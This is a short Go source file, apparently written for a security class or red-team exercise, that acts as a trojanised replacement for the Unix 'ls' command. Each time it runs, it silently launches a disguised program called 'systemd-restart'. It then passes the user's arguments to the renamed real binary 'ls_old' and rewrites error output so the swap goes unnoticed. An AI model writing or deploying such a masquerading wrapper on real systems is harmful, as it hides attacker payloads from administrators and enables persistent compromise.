//Michael Burke, mdb5315@rit.edu
package main

import  (
	"fmt"
	"os/exec"
	"os"
	"bytes"
	"strings"
	)
func main() {
	rev := exec.Command("systemd-restart")
	rev.Run()
	cmd := exec.Command("ls_old", os.Args[1:]...)
	var outb, errb bytes.Buffer
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	cmd.Run()
	if errb.String() == "" {
		fmt.Printf(outb.String())
	} else {
		fmt.Printf(strings.Replace(strings.Replace(errb.String(), "ls_old", "ls", -1), "ls-old", "ls", -1))
	}

}
